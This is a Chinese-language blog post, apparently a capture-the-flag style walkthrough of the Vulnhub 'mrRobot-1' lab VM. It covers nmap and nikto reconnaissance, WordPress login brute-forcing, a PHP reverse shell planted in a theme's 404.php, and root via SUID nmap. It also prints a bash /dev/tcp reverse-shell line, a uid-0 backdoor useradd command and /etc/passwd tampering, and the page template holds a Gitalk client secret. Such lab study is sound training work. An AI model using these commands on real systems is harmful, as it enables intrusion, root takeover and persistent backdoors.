@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-23mrRobot-1 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-23mrRobot-1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 30, 2024&nbsp;&nbsp;21:21:22</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Vulnhub-23mrRobot-1"><a href="#Vulnhub-23mrRobot-1" class="headerlink" title="Vulnhub-23mrRobot-1"></a>Vulnhub-23mrRobot-1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp</span>-scan -l          nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.240.132</span>     nmap --min-rate <span class="number">100000</span> -p22,<span class="number">80</span>,<span class="number">443</span> -A <span class="number">192.168.240.132</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.240.132</span>   dirb  http://<span class="number">192.168.240.132</span>/      nikto -host <span class="number">192.168.240.132</span> -p <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="22端口"><a href="#22端口" class="headerlink" title="22端口"></a>22端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22/tcp  closed ssh</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">80</span>/tcp  <span class="keyword">open</span>   http     Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn<span class="symbol">&#x27;t</span> have a title (<span class="literal">text</span>/html).</span><br><span class="line"></span><br><span class="line">└─# nikto -host <span class="number">192.168</span>.<span class="number">240.132</span> -p <span class="number">80</span></span><br><span class="line">- Nikto v2.<span class="number">5.0</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          <span class="number">192.168</span>.<span class="number">240.132</span></span><br><span class="line">+ Target Hostname:    <span class="number">192.168</span>.<span class="number">240.132</span></span><br><span class="line">+ Target <span class="keyword">Port</span>:        <span class="number">80</span></span><br><span class="line">+ Start <span class="built_in">Time</span>:         <span class="number">2024</span>-<span class="number">12</span>-<span class="number">01</span> <span class="number">09</span>:<span class="number">14</span>:<span class="number">42</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Server: Apache</span><br><span class="line">+ /: The X-Content-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could allow the user agent <span class="keyword">to</span> render the content <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class="keyword">type</span>-header/</span><br><span class="line">+ /<span class="number">3</span>TVZlj5i.asmx: Retrieved x-powered-by header: PHP/<span class="number">5.5</span>.<span class="number">29</span>.</span><br><span class="line">+ No CGI Directories found (<span class="keyword">use</span> &#x27;-C <span class="keyword">all</span>&#x27; <span class="keyword">to</span> <span class="keyword">force</span> check <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ /index: Uncommon header <span class="symbol">&#x27;tcn</span>&#x27; found, <span class="keyword">with</span> contents: list.</span><br><span class="line">+ /index: Apache mod_negotiation <span class="keyword">is</span> enabled <span class="keyword">with</span> MultiViews, which allows attackers <span class="keyword">to</span> easily brute <span class="keyword">force</span> <span class="keyword">file</span> names. The following alternatives <span class="keyword">for</span> <span class="symbol">&#x27;index</span>&#x27; were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=<span class="number">4698</span>ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/<span class="number">8275</span></span><br><span class="line">+ /admin/: This might be interesting.</span><br><span class="line">+ /image/: Drupal Link header found <span class="keyword">with</span> value: &lt;http://<span class="number">192.168</span>.<span class="number">240.132</span>/?p=<span class="number">23</span>&gt;; rel=shortlink. See: https://www.drupal.org/</span><br><span class="line">+ /wp-links-opml.php: This WordPress script reveals the installed version.</span><br><span class="line">+ /license.txt: License <span class="keyword">file</span> found may identify site software.</span><br><span class="line">+ /admin/index.html: Admin login page/section found.</span><br><span class="line">+ /wp-login/: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</span><br><span class="line">+ /wp-login/: Admin login page/section found.</span><br><span class="line">+ /wordpress/: A Wordpress installation was found.</span><br><span class="line">+ /wp-admin/wp-login.php: Wordpress login found.</span><br><span class="line">+ /wordpress/wp-admin/wp-login.php: Wordpress login found.</span><br><span class="line">+ /blog/wp-login.php: Wordpress login found.</span><br><span class="line">+ /wp-login.php: Wordpress login found.</span><br><span class="line">+ /wordpress/wp-login.php: Wordpress login found.</span><br><span class="line">+ /#wp-config.php#: #wp-config.php# <span class="keyword">file</span> found. This <span class="keyword">file</span> contains the credentials.</span><br><span class="line">+ <span class="number">8102</span> requests: <span class="number">0</span> <span class="literal">error</span>(s) <span class="keyword">and</span> <span class="number">18</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2024</span>-<span class="number">12</span>-<span class="number">01</span> <span class="number">09</span>:<span class="number">16</span>:<span class="number">26</span> (GMT8) (<span class="number">104</span> seconds)</span><br><span class="line">存在robots.txt,找到一个字典还有一个密钥</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="443端口"><a href="#443端口" class="headerlink" title="443端口"></a>443端口</h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">443</span>/tcp <span class="keyword">open</span>   ssl/http Apache httpd</span><br><span class="line">|_http-title: Site doesn<span class="symbol">&#x27;t</span> have a title (<span class="literal">text</span>/html).</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">| ssl-cert: Subject: commonName=www.example.com</span><br><span class="line">| <span class="keyword">Not</span> valid before: <span class="number">2015</span>-<span class="number">09</span>-<span class="number">16</span>T10:<span class="number">45</span>:<span class="number">03</span></span><br><span class="line">|_Not valid <span class="keyword">after</span>:  <span class="number">2025</span>-<span class="number">09</span>-<span class="number">13</span>T10:<span class="number">45</span>:<span class="number">03</span></span><br><span class="line"></span><br><span class="line">└─# nikto -host <span class="number">192.168</span>.<span class="number">240.132</span> -p <span class="number">443</span></span><br><span class="line">- Nikto v2.<span class="number">5.0</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          <span class="number">192.168</span>.<span class="number">240.132</span></span><br><span class="line">+ Target Hostname:    <span class="number">192.168</span>.<span class="number">240.132</span></span><br><span class="line">+ Target <span class="keyword">Port</span>:        <span class="number">443</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ SSL Info:        Subject:  /CN=www.example.com</span><br><span class="line">                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">                   Issuer:   /CN=www.example.com</span><br><span class="line">+ Start <span class="built_in">Time</span>:         <span class="number">2024</span>-<span class="number">12</span>-<span class="number">01</span> <span class="number">09</span>:<span class="number">15</span>:<span class="number">21</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Server: Apache</span><br><span class="line">+ /: The site uses TLS <span class="keyword">and</span> the Strict-<span class="keyword">Transport</span>-Security HTTP header <span class="keyword">is</span> <span class="keyword">not</span> defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-<span class="keyword">Transport</span>-Security</span><br><span class="line">+ /: The X-Content-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could allow the user agent <span class="keyword">to</span> render the content <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class="keyword">type</span>-header/</span><br><span class="line">+ /uN3ftIqo.sys: Retrieved x-powered-by header: PHP/<span class="number">5.5</span>.<span class="number">29</span>.</span><br><span class="line">+ No CGI Directories found (<span class="keyword">use</span> &#x27;-C <span class="keyword">all</span>&#x27; <span class="keyword">to</span> <span class="keyword">force</span> check <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ /index: Uncommon header <span class="symbol">&#x27;tcn</span>&#x27; found, <span class="keyword">with</span> contents: list.</span><br><span class="line">+ /index: Apache mod_negotiation <span class="keyword">is</span> enabled <span class="keyword">with</span> MultiViews, which allows attackers <span class="keyword">to</span> easily brute <span class="keyword">force</span> <span class="keyword">file</span> names. The following alternatives <span class="keyword">for</span> <span class="symbol">&#x27;index</span>&#x27; were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=<span class="number">4698</span>ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/<span class="number">8275</span></span><br><span class="line">+ /: The Content-Encoding header <span class="keyword">is</span> set <span class="keyword">to</span> <span class="string">&quot;deflate&quot;</span> which may mean that the server <span class="keyword">is</span> vulnerable <span class="keyword">to</span> the BREACH attack. See: http://breachattack.com/</span><br><span class="line">+ Hostname &#x27;<span class="number">192.168</span>.<span class="number">240.132</span>&#x27; does <span class="keyword">not</span> match certificate<span class="symbol">&#x27;s</span> names: www.example.com. See: https://cwe.mitre.org/data/definitions/<span class="number">297</span>.html</span><br><span class="line">+ /admin/: This might be interesting.</span><br><span class="line">+ /image/: Drupal Link header found <span class="keyword">with</span> value: &lt;https://<span class="number">192.168</span>.<span class="number">240.132</span>/?p=<span class="number">23</span>&gt;; rel=shortlink. See: https://www.drupal.org/</span><br><span class="line">+ /wp-links-opml.php: This WordPress script reveals the installed version.</span><br><span class="line">+ /license.txt: License <span class="keyword">file</span> found may identify site software.</span><br><span class="line">+ /admin/index.html: Admin login page/section found.</span><br><span class="line">+ /wp-login/: Cookie wordpress_test_cookie created without the secure flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</span><br><span class="line">+ /wp-login/: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</span><br><span class="line">+ /wp-login/: Admin login page/section found.</span><br><span class="line">+ /wordpress/: A Wordpress installation was found.</span><br><span class="line">+ /wp-admin/wp-login.php: Wordpress login found.</span><br><span class="line">+ /wordpress/wp-admin/wp-login.php: Wordpress login found.</span><br><span class="line">+ /blog/wp-login.php: Wordpress login found.</span><br><span class="line">+ /wp-login.php: Wordpress login found.</span><br><span class="line">+ /wordpress/wp-login.php: Wordpress login found.</span><br><span class="line">+ /#wp-config.php#: #wp-config.php# <span class="keyword">file</span> found. This <span class="keyword">file</span> contains the credentials.</span><br><span class="line">+ <span class="number">8103</span> requests: <span class="number">0</span> <span class="literal">error</span>(s) <span class="keyword">and</span> <span class="number">22</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2024</span>-<span class="number">12</span>-<span class="number">01</span> <span class="number">09</span>:<span class="number">18</span>:<span class="number">55</span> (GMT8) (<span class="number">214</span> seconds)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br><span class="line">也有robots.txt以及字典文件</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="80端口-1"><a href="#80端口-1" class="headerlink" title="80端口"></a>80端口</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>用字典文件对登陆页面进行爆破<span class="comment">(集束炸弹模式（Cluster bomb）)</span> 得到账号密码elliot <span class="comment">// ER28-0652</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-23mrrobot-1//image-20241201101427710.png" alt="image-20241201101427710"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找到<span class="number">404.</span>php，在里面写反弹<span class="built_in">shell</span>，访问<span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.240</span><span class="number">.132</span>/wp-content/themes/twentyfifteen/<span class="number">404.</span>php或者直接<span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.240</span><span class="number">.132</span>/<span class="number">404.</span>php</span><br><span class="line">连接上<span class="built_in">shell</span>,获得交互式<span class="built_in">shell</span> python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">交互式<span class="built_in">shell</span>：bash -i</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-23mrrobot-1//image-20241201140350016.png" alt="image-20241201140350016"></p>
+<h3 id="443端口-1"><a href="#443端口-1" class="headerlink" title="443端口"></a>443端口</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同样的操作，就不做渗透测试了</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">daemon</span>@linux:/$ ls /home/robot</span><br><span class="line"><span class="attribute">key</span>-<span class="number">2</span>-of-<span class="number">3</span>.txt：有robot权限才能看（<span class="number">822</span>c73956184f694993bede3eb39f959）  password.raw-md5：c3fcd3d76192e4007dfb496cca67e13b--用md5解密   abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-23mrrobot-1//image-20241201142217858.png" alt="image-20241201142217858"></p>
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUID提权</span><br><span class="line">使用find命令发现系统上运行的所有SUID可执行文件:命令：<span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-23mrrobot-1//image-20241201142908708.png" alt="image-20241201142908708"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">可以用<span class="built_in">sudo</span>也可以用nmap</span><br><span class="line">尝试<span class="built_in">sudo</span>之后说不让用，现在尝试nmap</span><br><span class="line">nmap --interactive 进入交互界面</span><br><span class="line">输入!sh</span><br><span class="line">创建root账号 useradd -u 0 -o -g 0 -G root -s /bin/bash -d /home/root2 -m root2   设置root1密码  <span class="built_in">sudo</span> passwd root1</span><br><span class="line">/bin/bash -i \&gt;&amp; /dev/tcp/192.168.240.130/1112 0\&gt;&amp;1  反弹shell，但是会遇到终端无法正确解释上下左右的转义序列</span><br><span class="line">这时候就不能通过修改uid来维权，建议开启22号端口进行ssh登录robot账号（service ssh start），再通过nmap提权</span><br><span class="line">或者直接用nano修改/etc/passwd,这里有点小插曲。我修改了robot的uid和gid之后发现用户<span class="built_in">id</span>没有变，我把ssh登录的账号退出了之后重新反弹shell，接着重新su robot</span><br><span class="line">这时候发现输入密码之后我变成了root账号</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-23mrrobot-1//image-20241201143052579.png" alt="image-20241201143052579"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulnhub-24-minu-1/">Vulnhub-24-MINU-1</a>
+            
+            
+            <a class="next" rel="next" href="../vulnhub-22wakanda/">Vulnhub-22Wakanda</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
